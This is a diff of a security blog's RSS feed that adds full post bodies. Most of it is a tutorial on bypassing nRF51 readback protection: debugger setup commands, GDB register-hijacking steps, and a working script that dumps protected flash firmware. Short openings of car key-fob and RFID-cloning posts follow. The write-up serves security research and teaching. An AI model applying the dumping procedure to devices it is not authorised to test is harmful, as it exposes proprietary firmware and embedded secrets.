@@ -1,38 +1,637 @@
 <?xml version="1.0" encoding="utf-8" standalone="yes"?>
-<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+<rss version="2.0"
+     xmlns:atom="http://www.w3.org/2005/Atom"
+     xmlns:content="http://purl.org/rss/1.0/modules/content/"
+     xmlns:media="http://search.yahoo.com/mrss/">
   <channel>
+
     <title>Physical security on less on sec</title>
     <link>https://lessonsec.com/tags/physical-security/</link>
-    <description>Recent content in Physical security on less on sec</description>
+    <description>
+      Recent content in Physical securityon less on sec
+    </description>
+
     <generator>Hugo -- gohugo.io</generator>
-    <language>en-us</language>
-    <lastBuildDate>Thu, 04 Sep 2025 21:41:00 +0200</lastBuildDate><atom:link href="https://lessonsec.com/tags/physical-security/index.xml" rel="self" type="application/rss+xml" />
-    <item>
-      <title>nRF51 RBPCONF bypass for firmware dumping</title>
-      <link>https://lessonsec.com/posts/nrf51-bypass/</link>
-      <pubDate>Thu, 04 Sep 2025 21:41:00 +0200</pubDate>
-      
-      <guid>https://lessonsec.com/posts/nrf51-bypass/</guid>
-      <description>A while ago I read about the firmware dumping technique proposed by Include Security to bypass RBPCONF (Readback Protection) on nRF51 family MCUs. Recently I could spend some time attempting to replicate the effects of their research.</description>
-    </item>
-    
-    <item>
-      <title>Attacking RKE: How to hack a car open</title>
-      <link>https://lessonsec.com/posts/attacking_rke_how_to_hack_a_car_open/</link>
-      <pubDate>Fri, 30 Dec 2022 22:30:14 +0100</pubDate>
-      
-      <guid>https://lessonsec.com/posts/attacking_rke_how_to_hack_a_car_open/</guid>
-      <description>I&amp;rsquo;ve always found cybersecurity to be more interesting when implications reflect in the &amp;ldquo;real world&amp;rdquo; and this is the reason hacking physical devices is fun to me. Well, it turns out that the more the hack is controversial, the funnier it is to carry out!</description>
-    </item>
-    
-    <item>
-      <title>Cloning RFID tags for fun and profit</title>
-      <link>https://lessonsec.com/posts/cloning-rfid-tags-for-fun-and-profit/</link>
-      <pubDate>Tue, 20 Apr 2021 16:27:00 +0200</pubDate>
-      
-      <guid>https://lessonsec.com/posts/cloning-rfid-tags-for-fun-and-profit/</guid>
-      <description>RFID tags are a technology commonly used but not limited to industrial purposes. These systems are in fact used every day as public transport passes, as security token in access control systems or as a digital &amp;ldquo;bar code&amp;rdquo; in shops.</description>
-    </item>
-    
+    <language>en</language>
+    <lastBuildDate>Thu, 04 Sep 2025 21:41:00 &#43;0200</lastBuildDate>
+    <atom:link href="https://lessonsec.com/tags/physical-security/index.xml" rel="self" type="application/rss&#43;xml" /><item>
+        <title>nRF51 RBPCONF bypass for firmware dumping</title>
+        <link>https://lessonsec.com/posts/nrf51-bypass/</link>
+        <guid isPermaLink="true">https://lessonsec.com/posts/nrf51-bypass/</guid>
+        <pubDate>Thu, 04 Sep 2025 21:41:00 &#43;0200</pubDate><description>A while ago I read about the firmware dumping technique proposed by Include Security to bypass RBPCONF (Readback Protection) on nRF51 family MCUs. Recently I could spend some time attempting to replicate the effects of their research.</description>
+	<content:encoded>&lt;p&gt;A while ago I read about the &lt;a href=&#34;https://blog.includesecurity.com/2015/11/firmware-dumping-technique-for-an-arm-cortex-m0-soc/&#34;&gt;firmware dumping technique proposed by Include Security&lt;/a&gt; to bypass RBPCONF (Readback Protection) on nRF51 family MCUs. Recently I could spend some time attempting to replicate the effects of their research.&lt;/p&gt;
+&lt;p&gt;The nRF51 series is Nordic Semiconductor’s family of low-power SoCs built around an ARM Cortex-M0. If you’ve played with Bluetooth Low Energy (BLE) gadgets from a few years back such as beacons, smart locks or fitness trackers there’s a good chance they had an nRF51 inside.&lt;/p&gt;
+&lt;p&gt;This technique is significant because retrieving the firmware is almost always the first step before any meaningful reverse engineering. Once the binary is available, an attacker can perform static or dynamic analysis to uncover hardcoded secrets, or look for exploitable bugs that could compromise the security of the system. For connected products such as smart locks, wearables, and IoT sensors, the impact of such access can be substantial.&lt;/p&gt;
+&lt;p&gt;What makes this bypass interesting is its non-invasive nature. Other approaches often involve some type of glitching, manipulating reset lines, or even destructive decapsulation, all of which risk damaging the device and require specialized equipment. In this case, the attack relies only on software manipulation through standard debugging interfaces. The target remains fully functional while its memory is exfiltrated, making the method practical and appealing.&lt;/p&gt;
+&lt;p&gt;So I decided to visit Aliexpress, bought two of the cheapest board I could find featuring an nRF51822 and went to work.&lt;/p&gt;
+&lt;h2 id=&#34;nrf51-security-in-a-nutshell&#34;&gt;nRF51 security in a nutshell&lt;/h2&gt;
+&lt;p&gt;As numerous other MCUs, the nRF51 family offers some way to prevent final users of the device from reading the flash memory of the MCU and recover the firmware. Much of the device’s security posture is controlled through a set of non-volatile registers called &lt;strong&gt;User Information Configuration Registers (UICR)&lt;/strong&gt; located at address &lt;code&gt;0x10001000&lt;/code&gt;. This registers are what allows for enabling protections on this devices family.&lt;/p&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th style=&#34;text-align:center&#34;&gt;&lt;img src=&#34;https://lessonsec.com/images/nrf51/uicr.png#center&#34; alt=&#34;UICR overview&#34;&gt;&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td style=&#34;text-align:center&#34;&gt;UICR overview&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;Registers inside UICR we are going to focus onto are: &lt;code&gt;CLENR0&lt;/code&gt; and &lt;code&gt;RBPCONF&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;Register &lt;code&gt;CLENR0&lt;/code&gt; is what allows dividing code flash in two areas: Code Region 0 (CR0) and Code Region 1 (CR1). CR0 always starts at &lt;code&gt;0x00000000&lt;/code&gt;, and its size is defined by the &lt;code&gt;CLENR0&lt;/code&gt; register. Everything above that boundary falls into CR1. If &lt;code&gt;CLENR0&lt;/code&gt; is left untouched (&lt;code&gt;0xFFFFFFFF&lt;/code&gt;), the whole flash is simply treated as CR1.&lt;/p&gt;
+&lt;p&gt;sThere are a few differences between CR0 and CR1:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Code running in CR0 cannot be modified by code running in CR1.&lt;/li&gt;
+&lt;li&gt;Pages of CR0 cannot be erased, CR0 is erasable only via chip-wide wipe (&lt;code&gt;ERASEALL&lt;/code&gt;)&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Generally speaking, this renders CR0 a more secure memory area suitable for critical software components or sensitive data storage.&lt;/p&gt;
+&lt;h3 id=&#34;understanding-rbpconf&#34;&gt;Understanding RBPCONF&lt;/h3&gt;
+&lt;p&gt;An nRF51 device can be configured with three different security configurations based on &lt;code&gt;RBPCONF&lt;/code&gt;: no protection, &lt;code&gt;PR0&lt;/code&gt; protection and &lt;code&gt;PALL&lt;/code&gt; protection.&lt;/p&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th style=&#34;text-align:center&#34;&gt;&lt;img src=&#34;https://lessonsec.com/images/nrf51/rbpconf.png#center&#34; alt=&#34;RBCONF Register&#34;&gt;&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td style=&#34;text-align:center&#34;&gt;RBCONF overview&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;&lt;code&gt;PR0&lt;/code&gt; register allows for locking CR0 memory area. This protection, when enabled, prevents firmware running from CR1 from reading CR0 memory as well as locking the read-back on CR0 area from SWD debugger.&lt;/p&gt;
+&lt;p&gt;The nRF51 also exposes the &lt;code&gt;PALL&lt;/code&gt; protection, which locks down all code memory (both CR0 and CR1). Once &lt;code&gt;PALL&lt;/code&gt; is enabled, no external debugger reads are possible. The only way to disable this protection is to perform a full chip erase (&lt;code&gt;ERASEALL&lt;/code&gt;), which wipes both application and configuration data, protecting the firmware from exfiltration. The &lt;code&gt;PALL&lt;/code&gt; mechanism is intended as &amp;ldquo;production lock&amp;rdquo; and is the strongest protection mechanism available in these MCUs.&lt;/p&gt;
+&lt;p&gt;One security measure other SoCs offer, is to completely disable debugger accesses. However this is not a possibility with the nRF51 and even though the debugger won&amp;rsquo;t be able to access flash memory directly, this poses a risk to the device and it is exactly the weakness we are abusing to access the whole memory.&lt;/p&gt;
+&lt;h3 id=&#34;exploiting-rbpconf&#34;&gt;Exploiting RBPCONF&lt;/h3&gt;
+&lt;p&gt;The protection mechanisms in place allow only code already present in the CR0 to read flash memory.&lt;/p&gt;
+&lt;p&gt;External debuggers are blocked from issuing flash memory reads directly. So, in order to extract data from the protected memory we will abuse the execution environment against itself. The register state, unlike the flash, remains observable and editable through the debugger interface.&lt;/p&gt;
+&lt;p&gt;The &lt;code&gt;RBPCONF&lt;/code&gt; bypass is based on the fact that, being able to control CPU registers, it would be possible to halt and single step the CPU executing the firmware and change the behavior of instructions by altering generic purpose CPU registers values. This way it is possible to hijack instructions already residing in CR0 memory area.
+With this knowledge available it&amp;rsquo;s just a matter of finding a load instruction that will take an address from one of the registers and puts the value from that address back to one of the registers.&lt;/p&gt;
+&lt;p&gt;Nordic’s model assumes that isolating CR0 and requiring ERASEALL for modification is sufficient to protect sensitive firmware. However, the lack of debugger lockout means these guarantees can be bypassed.&lt;/p&gt;
+&lt;h2 id=&#34;the-setup&#34;&gt;The Setup&lt;/h2&gt;
+&lt;p&gt;&lt;strong&gt;Hardware:&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;nRF51822 dev board&lt;/li&gt;
+&lt;li&gt;SEGGER J-Link&lt;/li&gt;
+&lt;li&gt;Linux host machine&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;strong&gt;Software:&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&#34;www.segger.com/products/development-tools/embedded-studio/&#34;&gt;SEGGER Embedded Studio&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://openocd.org/&#34;&gt;OpenOCD&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://www.nordicsemi.com/Products/Development-tools/nrf-command-line-tools/download&#34;&gt;nRF Command Line Tools&lt;/a&gt; (not strictly required, but handy for enabling protections &amp;amp; restoring a locked device)&lt;/li&gt;
+&lt;li&gt;arm-none-eabi-gdb + Python for automation&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;The board I&amp;rsquo;m using is this one:&lt;/p&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th style=&#34;text-align:center&#34;&gt;&lt;img src=&#34;https://lessonsec.com/images/nrf51/board.png#center&#34; alt=&#34;nRF51 board&#34;&gt;&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td style=&#34;text-align:center&#34;&gt;nRF51822 dev board&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;Fortunately SWD pins (SWDIO, SWDCLK) are exposed and it was possible to attempt opening a debug interface straight away. However pin distancing was not compatible with any breakout or breadboard I had at home, so I resorted to using some integrated circuit hooks and these ended up working just as fine.&lt;/p&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th style=&#34;text-align:center&#34;&gt;&lt;img src=&#34;https://lessonsec.com/images/nrf51/setup.png#center&#34; alt=&#34;nRF51 board connected&#34;&gt;&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td style=&#34;text-align:center&#34;&gt;Dev board connected to debugger&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;Once board&amp;rsquo;s pins VCC, GND, SWDIO and SWDCLK are connected to J-Link&amp;rsquo;s corresponding pins it was possible to obtain SWD debug access both with J-Link suite tools and with OpenOCD using the commands:&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;openocd -f /usr/share/openocd/scripts/interface/jlink.cfg -c &amp;quot;transport select swd&amp;quot; -f /usr/share/openocd/scripts/target/nrf51.cfg&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;JLinkGDBServer -device nrf51822_XXAA -if SWD&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;Personally I&amp;rsquo;m more keen on using OpenOCD for this exploitation specifically because J-Link suite wouldn&amp;rsquo;t allow opening  a GDB connection to nRF51 if the &lt;code&gt;PALL&lt;/code&gt; protection is enabled.&lt;/p&gt;
+&lt;p&gt;Once the SWD connection is achieved, we need to flash the device with a custom firmware, to do so I used SEGGER Embedded Studio as it was the fastest way to setup the SDK and toolchain for our target device.&lt;/p&gt;
+&lt;p&gt;For this demo a firmware containing a single &lt;code&gt;printf(&amp;quot;SECRET&amp;quot;)&lt;/code&gt; is used and the objective will be to confirm whether the string can still be retrieved with &lt;code&gt;PALL&lt;/code&gt; protection enabled.&lt;/p&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th style=&#34;text-align:center&#34;&gt;&lt;img src=&#34;https://lessonsec.com/images/nrf51/firmware.png#center&#34; alt=&#34;firmware&#34;&gt;&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td style=&#34;text-align:center&#34;&gt;Dummy firmware&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;Once the firmware is flashed, we can perform a few tests without protection enabled in order to better understand the differences in the behavior of the debugger when the protection is OFF and when it is ON.&lt;/p&gt;
+&lt;p&gt;With the GDB server running, we can attempt connecting and reading some memory:&lt;/p&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th style=&#34;text-align:center&#34;&gt;&lt;img src=&#34;https://lessonsec.com/images/nrf51/noprotection.png#center&#34; alt=&#34;no_protection&#34;&gt;&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td style=&#34;text-align:center&#34;&gt;Memory read demo - no protection&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;As it is possible to see, bytes are correctly read back from flash memory.
+In addition notice how we also read  &lt;code&gt;0xE000ED00 (CPUID)&lt;/code&gt; this register will always be populated with &lt;code&gt;0x410CC200&lt;/code&gt; on nRF51 and the value is readable when &lt;code&gt;PALL&lt;/code&gt; protection is in place as well, rendering it a good reference value for future experiments.&lt;/p&gt;
+&lt;p&gt;At this point we can enable the &lt;code&gt;PALL&lt;/code&gt; protection with command &lt;code&gt;nrfjprog --rbp ALL&lt;/code&gt;, reboot the target device and attempt performing the same operations again.&lt;/p&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th style=&#34;text-align:center&#34;&gt;&lt;img src=&#34;https://lessonsec.com/images/nrf51/protection.png#center&#34; alt=&#34;protection_on&#34;&gt;&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td style=&#34;text-align:center&#34;&gt;Memory read demo - with protection&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;We note how the same addresses come back as &lt;code&gt;0x00000000&lt;/code&gt; when read back.&lt;/p&gt;
+&lt;h2 id=&#34;dumping-the-firmware&#34;&gt;Dumping the firmware&lt;/h2&gt;
+&lt;p&gt;The exploitation of the vulnerability goes through 2 steps: locating a load instruction and abusing it to read protected memory.&lt;/p&gt;
+&lt;p&gt;To achieve the first, it is possible to use GDB to set each register to address &lt;code&gt;0xE000ED00&lt;/code&gt; since it contains a known value. If the instruction PC is pointing is a load, we should find the expected value (&lt;code&gt;0x410CC200&lt;/code&gt;) in one of the registers.&lt;/p&gt;
+&lt;p&gt;We will simply need to issue commands:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;set $r0&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;$r1&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;$r2&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;$r3&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;$r4&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;$r5&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;$r6&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;$r7&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;$r8&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;$r9&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;$r10&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;$r11&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;$r12&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;0xE000ED00
+stepi
+info registers
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;And we will monitor the output of &lt;code&gt;info registers&lt;/code&gt; to see if any of the register gets populated with the expected value.&lt;/p&gt;
+&lt;p&gt;That&amp;rsquo;s exactly what happens after a few iterations of this:&lt;/p&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th style=&#34;text-align:center&#34;&gt;&lt;img src=&#34;https://lessonsec.com/images/nrf51/manual_read.png#center&#34; alt=&#34;manual load&#34;&gt;&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td style=&#34;text-align:center&#34;&gt;Load instruction found&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;We can see that after the execution of instruction at &lt;code&gt;PC=0x82&lt;/code&gt; we have our expected value in register &lt;code&gt;r0&lt;/code&gt;.
+Once the load instruction is located, it is necessary to attempt reading bytes from the protected memory.&lt;/p&gt;
+&lt;p&gt;So now we populate registers with value &lt;code&gt;0x00000000&lt;/code&gt; and attempt reading that word.&lt;/p&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th style=&#34;text-align:center&#34;&gt;&lt;img src=&#34;https://lessonsec.com/images/nrf51/prot_mem_read.png#center&#34; alt=&#34;protected memory read&#34;&gt;&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td style=&#34;text-align:center&#34;&gt;Value read from CR0&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;and as expected we are able to read the first byte of protected memory.&lt;/p&gt;
+&lt;p&gt;Now it&amp;rsquo;s time to render the exploit practical and to automate the firmware extraction and we can achieve this in several ways, I&amp;rsquo;ve decided to simply script the interaction with GDB commands.
+Depending on the exact MCU you&amp;rsquo;re working with, you may encounter different flash sizes. In this case we are working with an &lt;code&gt;nRF51822_XXAA&lt;/code&gt; which is the most commonly available variant of nRF51822 around and features 256kB of flash memory.&lt;/p&gt;
+&lt;p&gt;The extraction script will look something like this:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;set $i &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
+set $end &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; 0x3FFFF
+&lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; $i &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; $end
+  set $pc&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;0x82
+
+  set $r0&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;$r1&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;$r2&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;$r3&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;$r4&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;$r5&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;$r6&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;$r7&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;$r8&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;$r9&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;$r10&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;$r11&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;$r12&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;$i
+  stepi
+
+  printf &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;0x%08x\n&amp;#34;&lt;/span&gt;, $r0
+  set $i&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;$i+4
+end
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;and the output on the terminal when the script is executed looks like this:&lt;/p&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th style=&#34;text-align:center&#34;&gt;&lt;img src=&#34;https://lessonsec.com/images/nrf51/auto_read.png#center&#34; alt=&#34;scripted read&#34;&gt;&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td style=&#34;text-align:center&#34;&gt;Scripted memory read&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;After letting it run the script will have gone through the entire code space. A simple parser will then be used to cleanup the retrieved data and rebuild the binary file.&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;For ease of use I&amp;rsquo;ve decided to write a more usable script capable of automatically detecting the load function, dump the firmware and reassemble it to generate a binary output.&lt;/p&gt;
+&lt;p&gt;You can find it at: &lt;a href=&#34;https://github.com/0xless/nRF51-RBPCONF-Bypass&#34;&gt;https://github.com/0xless/nRF51-RBPCONF-Bypass&lt;/a&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;Once the script has finished running, in under 54 minutes, we get &lt;code&gt;firmware.bin&lt;/code&gt; file:&lt;/p&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th style=&#34;text-align:center&#34;&gt;&lt;img src=&#34;https://lessonsec.com/images/nrf51/time.png#center&#34; alt=&#34;dump complete&#34;&gt;&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td style=&#34;text-align:center&#34;&gt;Dump completed in 54 minutes&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;And performing &lt;code&gt;xxd&lt;/code&gt; on the extracted firmware allow us to recover out &lt;code&gt;SECRET&lt;/code&gt; value.&lt;/p&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th style=&#34;text-align:center&#34;&gt;&lt;img src=&#34;https://lessonsec.com/images/nrf51/extracted_secret.png#center&#34; alt=&#34;secret extracted&#34;&gt;&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td style=&#34;text-align:center&#34;&gt;Secret value recovered from firmware&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;This proves the functioning of the exploit and the practicality of this attack.&lt;/p&gt;
+&lt;p&gt;The PoC script developed for this attack is far from perfect, it takes a lot of time to execute and the GDB + Python interaction is a bit &amp;ldquo;hacky&amp;rdquo;.  A huge improvement it is possible to make is to aim to find instructions that load more bytes of flash memory to registers; an example would be &lt;code&gt;LDMIA Rn!, {Rlist}&lt;/code&gt; that allow up to 32 bytes loads in a single step. When reading the memory, it is easy to evaluate the OPCODE of the instruction just read, if it&amp;rsquo;s a &lt;code&gt;LDMIA&lt;/code&gt; instruction, then we can edit the PC register value to jump there and attempt exfiltrating memory at higher speed.&lt;/p&gt;
+&lt;p&gt;I&amp;rsquo;ve attempted sketching this using GDB scripting, but as the complexity of the project increased I realized this scripting language was not the tool for the job. For future developments I want to rewrite the whole script in python using library &lt;code&gt;pyswd&lt;/code&gt; which looks promising in handling SWD interactions directly via python, however it is compatible with ST-Link debuggers only (which I don&amp;rsquo;t own).&lt;/p&gt;
+&lt;h2 id=&#34;conclusions&#34;&gt;Conclusions&lt;/h2&gt;
+&lt;p&gt;The nRF51’s RBPCONF was designed to keep firmware safe, but not allowing final users to disable debugger access weakens the model. Even under PALL protection, careful register manipulation and instruction reuse make full extraction possible with modest tools.&lt;/p&gt;
+&lt;p&gt;In this post we demonstrated how it is possible to do so and walked all the steps needed to discover the issue and replicate the attack.&lt;/p&gt;
+</content:encoded>
+
+      </item><item>
+        <title>Attacking RKE: How to hack a car open</title>
+        <link>https://lessonsec.com/posts/attacking_rke_how_to_hack_a_car_open/</link>
+        <guid isPermaLink="true">https://lessonsec.com/posts/attacking_rke_how_to_hack_a_car_open/</guid>
+        <pubDate>Fri, 30 Dec 2022 22:30:14 &#43;0100</pubDate><description>I&amp;rsquo;ve always found cybersecurity to be more interesting when implications reflect in the &amp;ldquo;real world&amp;rdquo; and this is the reason hacking physical devices is fun to me. Well, it turns out that the more the hack is controversial, the funnier it is to carry out!</description>
+	<content:encoded>&lt;p&gt;I&amp;rsquo;ve always found cybersecurity to be more interesting when  implications reflect in the &amp;ldquo;real world&amp;rdquo; and this is the reason hacking  physical devices is fun to me. Well, it turns out that the more the hack is controversial, the funnier it is to carry out!  For this reason I  got into remote controlled devices hacking, and in particular into car  remotes hacking. A while ago I got all the hardware needed to attempt  attacking these devices, so I could finally attempt some attacks.&lt;/p&gt;
+</content:encoded>
+
+      </item><item>
+        <title>Cloning RFID tags for fun and profit</title>
+        <link>https://lessonsec.com/posts/cloning-rfid-tags-for-fun-and-profit/</link>
+        <guid isPermaLink="true">https://lessonsec.com/posts/cloning-rfid-tags-for-fun-and-profit/</guid>
+        <pubDate>Tue, 20 Apr 2021 16:27:00 &#43;0200</pubDate><description>RFID tags are a technology commonly used but not limited to industrial purposes. These systems are in fact used every day as public transport passes, as security token in access control systems or as a digital &amp;ldquo;bar code&amp;rdquo; in shops.</description>
+	<content:encoded>&lt;p&gt;RFID tags are a technology commonly used but not limited to industrial purposes. These systems are in fact used every day as public transport passes, as security token in access control systems or as a digital &amp;ldquo;bar code&amp;rdquo; in shops.
+Given the diffusion these tags have, it&amp;rsquo;s important to understand how they work and the security implication of their use.&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Radio-frequency identification (RFID) uses electromagnetic fields to automatically identify and track tags attached to objects.&lt;br&gt;
+An RFID system consists of a tiny radio transponder, a radio receiver and transmitter. When triggered by an electromagnetic interrogation pulse from a nearby RFID reader device,  the tag transmits digital data, back to the reader. - &lt;a href=&#34;https://en.wikipedia.org/wiki/Radio-frequency_identification&#34;&gt;Wikipedia&lt;/a&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th style=&#34;text-align:center&#34;&gt;&lt;img src=&#34;https://lessonsec.com/images/rfid/main.jpg&#34; alt=&#34;rfid tools&#34;&gt;&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td style=&#34;text-align:center&#34;&gt;RFID tools&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;h3 id=&#34;whats-rfid&#34;&gt;What&amp;rsquo;s RFID?&lt;/h3&gt;
+&lt;p&gt;RFID is a set of standards and technologies because it includes multiple frequency ranges such as:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;LF: 120–150 kHz&lt;/li&gt;
+&lt;li&gt;HF: 13.56 MHz&lt;/li&gt;
+&lt;li&gt;UHF: 433 MHz&lt;/li&gt;
+&lt;li&gt;UHF: 865–868 MHz (Europe) 902–928 MHz (North America)&lt;/li&gt;
+&lt;li&gt;microwave: 2450–5800 MHz&lt;/li&gt;
+&lt;li&gt;microwave: 3.1–10 GHz&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;In practice, only tags operating in the LF range are commonly called RFID tags while tags operating in the HF range are called NFC tags.&lt;br&gt;
+The rest are radio technologies not limited to the near field use (i.e. bluetooth).&lt;/p&gt;
